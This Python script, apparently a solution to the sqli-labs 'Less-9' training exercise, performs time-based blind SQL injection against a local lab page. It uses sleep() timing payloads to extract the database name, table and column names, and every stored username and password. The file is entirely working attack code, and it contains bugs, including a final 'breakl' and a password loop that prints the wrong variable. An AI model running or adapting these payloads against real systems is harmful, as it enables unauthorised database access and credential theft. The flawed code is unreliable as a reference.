import requests
from time import time

url='http://localhost/sqli-labs-master/Less-9/?id='

cmp='You are in...........'

len1=0
str1=""
str2=""
str3=""
str4=""

for i in range(1,10):
	query=url+"0' or if(length(database())="+str(i)+",sleep(.2),null)-- -"
	start=time()
	req=requests.get(query)
	res=req.text
	end=time()
	diff=end-start
	if(diff>.5):
		len1=i
		print("length is"+str(i))
		len1=i
		break

			#DATABASE NAME WALA LOOP

for i in range(1,len1+1):
	for j in range(65,123):
			query=url+"0' or if(ascii(substr(database(),"+str(i)+",1))="+str(j)+",sleep(.2),null)-- -"
			start=time()
			req=requests.get(query)
			res=req.text
			end=time()
			diff=end-start
			if(diff>1):
				str1+=chr(j)
				print(str1)
				break
print("database name: "+ str1)

#NO OF TABLES IN  information_schema.tables

for i in range(1,100):
	query=url+"0' or if((select count(*) from information_schema.tables where table_schema=database())="+str(i)+",sleep(.2),null)-- -" 
	s=time()
	req=requests.get(query)
	res=req.text
	e=time()
	d=e-s
	if(d>1):
		print(i)
		break

		# LENGTH OF TABLENAME WALA LOOP

for i in range(1,1000):
	query=url+"0' or if((select length(group_concat(table_name)) from information_schema.tables where table_schema=database())="+str(i)+",sleep(.2),null)-- -"
	s=time()
	req=requests.get(query)
	res=req.text
	e=time()
	d=e-s
	if(d>1):
		print(i)
		break

		#TABLE NAME WALA LOOP

for i  in range(1,63+1):
	for j in range(33,127):
		query=url+"0'or if(ascii(substr((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),"+str(i)+",1))="+str(j)+",sleep(.4),null )-- -"
		s=time()
		req=requests.get(query)
		res=req.text
		e=time()
		d=e-s
		if(d>.4):
			str2+=chr(j)
			print(str2)
			break
 		
 		#LENGTH OF COLUMN NAME
		
for j in range(1,100):
	query=url+"0' or if((SELECT LENGTH(group_concat(column_name)) FROM information_schema.columns WHERE table_name='users')="+str(j)+",sleep(.2),null) -- -" 
	s=time()
	req=requests.get(query)
	res=req.text
	e=time()
	d=e-s
	if (d>.2):
		print(j)
		z=j
		break


     #COLUMN NAME


for i in range(1,z+1):
	for j in range(33,127):
		query=url+"0'or if(ascii(substr((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'),"+str(i)+",1))="+str(j)+",sleep(.2),null)-- -"
		s=time()
		req=requests.get(query)
		res=req.text
		e=time()
		d=e-s
		if(d>.2):
			str3+=chr(j)
			print(str3)
			break
			
			#LENGTH OF USERNAME

for i in range(1,1000):
    query=url+"0' or if((SELECT LENGTH(group_concat(username)) FROM users)="+str(i)+",sleep(.2),null )-- -" 
    s=time()
    req=requests.get(query)
    res=req.text
    e=time()
    d=e-s
    if (d>.2):
    	l=i
    	print(i)
    	break

    ## LENGTH PWRD WALA LOOP
for i in range(1,1000):
    query=url+"0' or if((SELECT LENGTH(group_concat(password)) FROM users)="+str(i)+",sleep(.2),null )-- -" 
    s=time()
    req=requests.get(query)
    res=req.text
    e=time()
    d=e-s
    if (d>.2):
    	m=i
    	print(i)
    	break

    	##PASSWORD WALA LOOP

str5=""
for j in range(1,l+1):
   for i in range(33,123):
        query=url+"0'or if(ascii(substr((SELECT group_concat(username) from users),"+str(j)+",1))="+str(i)+",sleep(.2),null)-- -"
        s=time()
        req=requests.get(query)
        res=req.text
        e=time()
        d=e-s
        if (d>.2):
        	str4+=chr(i)
        	print(str4)
        	break
for j in range(1,m+1):
   for i in range(33,123):
        query=url+"0'or if(ascii(substr((SELECT group_concat(password) from users),"+str(j)+",1))="+str(i)+",sleep(.2),null)-- -"
        s=time()
        req=requests.get(query)
        res=req.text
        e=time()
        d=e-s
        if (d>.2):
        	str5+=chr(i)
        	print(str4)
        	breakl